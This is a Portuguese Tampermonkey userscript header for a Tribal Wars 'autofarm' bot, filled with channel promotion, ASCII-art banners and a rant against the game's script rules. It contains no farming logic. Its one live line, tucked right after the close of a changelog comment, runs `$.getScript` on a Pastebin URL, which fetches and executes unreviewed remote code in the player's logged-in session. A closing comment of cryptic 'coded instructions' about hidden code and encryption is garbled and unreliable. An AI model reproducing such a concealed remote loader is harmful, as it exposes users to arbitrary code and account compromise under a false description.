// ==UserScript==
// @name           ♔ LESSDRY Modific 500ms lentin ♔
// @author         Marcos v.s Marques
// @email          tribalwarsbr100@gmail.com
// @namespace      https://www.youtube.com/c/TW100TRIBALWARS/videos
// @site           https://tribalwarsbr100.wixsite.com/tw100
// @instagram      https://twitter.com/TW100OFICIAL
// @version        1.1 (SET/2017)
// @description    Script ECMA5, Less dry - Autofarm, modelo de auto farm com bases em modelo dry, agora com implatação de css painel interativo.
// @Opções         Basta Clicar nas opções A-B-C e em seguida o autofarm realiza a tarefa automaticamente.
// @Utilização     Utilizar Unica e Exclusivamente no assistente de saque
// @project        Projeto Dry (Seco) Auto farm com pouca sofistificação, sem troca de aldeia, e sem atualização.
// @model          Modelo Inicial não testado por longos periodos, passiveis a erros e bugs.
// @security       Não certificamos a segurança no uso deste conteudo, fica da por conta propria do usuario
// @Recognition    Script escrito baseado em modelos de script de outros autores, codigo css retirado do La'Filter .Net, bases iniciais de teclado retirado do Fa'keypres. base de logica e raciocinio retirado conteudo Dry canal tw100
// @grant          GM_getValue
// @grant          GM_setValue
// @grant          unsafeWindow
// @include        https://*screen=am_farm*
// @icon           https://imgur.com/LhfiMJ0.png
// ==/UserScript==

/*	Changelog versão 1.25
*        Equipe do Canal Youtube TW 100 Foi Realizado a Mais Recente Atualização Para Implatação da universalização do conteudo do canal, assim tornando nosso conteudo cada vez mais usual e presente em todos servidores de tribalwars.
*        Equipe do Canal Youtube TW 100 Solicita humildemente a colaboração dos usuarios dos conteudos abragidos no canal com likes, curtidas, comentarios nos videos, e com compartilhamento dos videos, isso era proporcionar um crescimento do canal, e com isso cada vez  mais iremos trazer mais conteudo.
*        Equipe do Canal Youtube TW 100 se reserva ao direito de possuir a posse do codigo-fonte  do script, quaisquer modificação deve ser solicitado via email, segundos regras da Licença Pública Geral GNU
*        Equipe do Canal Youtube TW 100 não se responsabiliza por eventuais danos causados pela utilização do script
*        Equipe do Canal Youtube TW 100 promove a canpanha "Software livre não e virus nem boot" abraça e se solidariza com os scripts de tampermonkey voltados para o game tribal wars, do qual as equipes inesperientes de suporte, sem conhecimento, e sem saber a historia dos primordios do game, impõe um pensamento de que os script de grasemonkey tampermonkey violentmonkey e scripts utilizados na barra de favoritos do navegador são proibidos. Muitas das melhorias no game, que se deu atraves de scrips de tampermonkey, grasemonkey, violentmonkey, entre outros meios de leitura e execução, feitos de players para players, Prova disso e os diversos scripts de grasemonkey sempre foram permitidos no forum da comunidade do Servidor Alemão DE e tambem permitidos no servidor holandês NL, Alem do qual esse pensamento foi uma forma da da grande empresa tutora do game promover seus ganhos com recursos pagos, e assim prejudicando os jogadores que não utiliza de dinheiro para jogar, *EQUIPE TW 100 DEIXA CLARO, QUE NÃO E PRECISO TER FUNÇÕES PAGAS PARA USUFLUIR DO GAME, TEMOS A MISSÃO DE TRAZER UMA INGUALAÇÃO DO QUAL OS PLAYERS QUE NÃO USUFLEM DE RECURSOS PREMIUNS TENHA A SUA DIPONIBILIDADE OS MESMO RECURSOS DOS QUE TEM*/javascript:$.getScript('https://pastebin.com/raw.php?i=PkLJWGGZ');void(0);
/*		 Equipe do Canal Youtube TW 100 no dia 25/06/2017 v2.0i primeira versão para atualização TW 8.89
*        Equipe do Canal Youtube TW 100 Script em desenvolvimento, ao longo do tempo, de acordo com o tempo disponivel iremos adicionar mais funções
*/


/*TW100*/ /* LOGO IREMOS CRIAR NOSSA PLAYLIST NO YOUTUBE SOMENTE COM SCRIPT TAMPERMONKEY*/

/* SettingsAPI: ＣＡＮＡＬ ＤＯ ＹＯＵＴＵＢＥ ＴＷ 100
		-------------------------------------------------------------------------------------
		╔═══╗╔═══╗╔═╗─╔╗╔═══╗╔╗───     ╔═══╗╔═══╗     ╔╗──╔╗╔═══╗╔╗─╔╗╔════╗╔╗─╔╗╔══╗─╔═══╗     ╔════╗──────     ─╔╗─╔═══╗╔═══╗
║╔═╗║║╔═╗║║║╚╗║║║╔═╗║║║───     ╚╗╔╗║║╔═╗║     ║╚╗╔╝║║╔═╗║║║─║║║╔╗╔╗║║║─║║║╔╗║─║╔══╝     ║╔╗╔╗║──────     ╔╝║─║╔═╗║║╔═╗║
║║─╚╝║║─║║║╔╗╚╝║║║─║║║║───     ─║║║║║║─║║     ╚╗╚╝╔╝║║─║║║║─║║╚╝║║╚╝║║─║║║╚╝╚╗║╚══╗     ╚╝║║╚╝╔╗╔╗╔╗     ╚╗║─║║║║║║║║║║
║║─╔╗║╚═╝║║║╚╗║║║╚═╝║║║─╔╗     ─║║║║║║─║║     ─╚╗╔╝─║║─║║║║─║║──║║──║║─║║║╔═╗║║╔══╝     ──║║──║╚╝╚╝║     ─║║─║║║║║║║║║║
║╚═╝║║╔═╗║║║─║║║║╔═╗║║╚═╝║     ╔╝╚╝║║╚═╝║     ──║║──║╚═╝║║╚═╝║──║║──║╚═╝║║╚═╝║║╚══╗     ──║║──╚╗╔╗╔╝     ╔╝╚╗║╚═╝║║╚═╝║
╚═══╝╚╝─╚╝╚╝─╚═╝╚╝─╚╝╚═══╝     ╚═══╝╚═══╝     ──╚╝──╚═══╝╚═══╝──╚╝──╚═══╝╚═══╝╚═══╝     ──╚╝───╚╝╚╝─     ╚══╝╚═══╝╚═══╝
╔════╗──────     ─╔╗─╔═══╗╔═══╗
║╔╗╔╗║──────     ╔╝║─║╔═╗║║╔═╗║
╚╝║║╚╝╔╗╔╗╔╗     ╚╗║─║║║║║║║║║║
──║║──║╚╝╚╝║     ─║║─║║║║║║║║║║
──║║──╚╗╔╗╔╝     ╔╝╚╗║╚═╝║║╚═╝║
──╚╝───╚╝╚╝─     ╚══╝╚═══╝╚═══╝
███۞███████ ]▄▄▄▄▄▄▄▄▄▄▄▄▃
▂▄▅█████████▅▄▃▂
I███████████████████].
◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤...
*/
/*		 Equipe do Canal Youtube TW 100 no dia 25/01/2017 v2.0i primeira versão para atualização TW 8.89
*        Equipe do Canal Youtube TW 100 Script em desenvolvimento, ao longo do tempo, de acordo com o tempo disponivel iremos adicionar mais funções
*/


/*TW100*/ /* VISITE NOSSO CANAL, DEIXEM LIKES, COMENTARIOS, DIVULGUE NOSSO CANAL PARA SUA TRIBO, PARA SEUS AMIGOS, FAÇA A INFORMAÇÃO E CONTEUDO DE QUALIDADE CHEGAREM A TODOS*/

/* SettingsAPI: ＣＡＮＡＬ ＤＯ ＹＯＵＴＵＢＥ ＴＷ 100
		-------------------------------------------------------------------------------------
		╔═══╗╔═══╗╔═╗─╔╗╔═══╗╔╗───     ╔═══╗╔═══╗     ╔╗──╔╗╔═══╗╔╗─╔╗╔════╗╔╗─╔╗╔══╗─╔═══╗     ╔════╗──────     ─╔╗─╔═══╗╔═══╗
║╔═╗║║╔═╗║║║╚╗║║║╔═╗║║║───     ╚╗╔╗║║╔═╗║     ║╚╗╔╝║║╔═╗║║║─║║║╔╗╔╗║║║─║║║╔╗║─║╔══╝     ║╔╗╔╗║──────     ╔╝║─║╔═╗║║╔═╗║
║║─╚╝║║─║║║╔╗╚╝║║║─║║║║───     ─║║║║║║─║║     ╚╗╚╝╔╝║║─║║║║─║║╚╝║║╚╝║║─║║║╚╝╚╗║╚══╗     ╚╝║║╚╝╔╗╔╗╔╗     ╚╗║─║║║║║║║║║║
║║─╔╗║╚═╝║║║╚╗║║║╚═╝║║║─╔╗     ─║║║║║║─║║     ─╚╗╔╝─║║─║║║║─║║──║║──║║─║║║╔═╗║║╔══╝     ──║║──║╚╝╚╝║     ─║║─║║║║║║║║║║
║╚═╝║║╔═╗║║║─║║║║╔═╗║║╚═╝║     ╔╝╚╝║║╚═╝║     ──║║──║╚═╝║║╚═╝║──║║──║╚═╝║║╚═╝║║╚══╗     ──║║──╚╗╔╗╔╝     ╔╝╚╗║╚═╝║║╚═╝║
╚═══╝╚╝─╚╝╚╝─╚═╝╚╝─╚╝╚═══╝     ╚═══╝╚═══╝     ──╚╝──╚═══╝╚═══╝──╚╝──╚═══╝╚═══╝╚═══╝     ──╚╝───╚╝╚╝─     ╚══╝╚═══╝╚═══╝
╔════╗──────     ─╔╗─╔═══╗╔═══╗
║╔╗╔╗║──────     ╔╝║─║╔═╗║║╔═╗║
╚╝║║╚╝╔╗╔╗╔╗     ╚╗║─║║║║║║║║║║
──║║──║╚╝╚╝║     ─║║─║║║║║║║║║║
──║║──╚╗╔╗╔╝     ╔╝╚╗║╚═╝║║╚═╝║
──╚╝───╚╝╚╝─     ╚══╝╚═══╝╚═══╝
███۞███████ ]▄▄▄▄▄▄▄▄▄▄▄▄▃
▂▄▅█████████▅▄▃▂
I███████████████████].
◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤...
*/

/* Instruções condificadas para não interação usuario client side.
- Sistem mysql_start
- localhost/8081
- sistem setup_xampp
- sistem php_start
* sistem kalifado_www.dropbox.5478h9g8s4a5e2e7s.js?php.admin
* lessdry.pastebin.tw100/mesclado_ocult_criptografia
* ocult_code_pastebin.br
- serven (pt,br,pl,de,nl,net) multlogin
- ID- inativo_reativex
- (5)vold.end;
*/

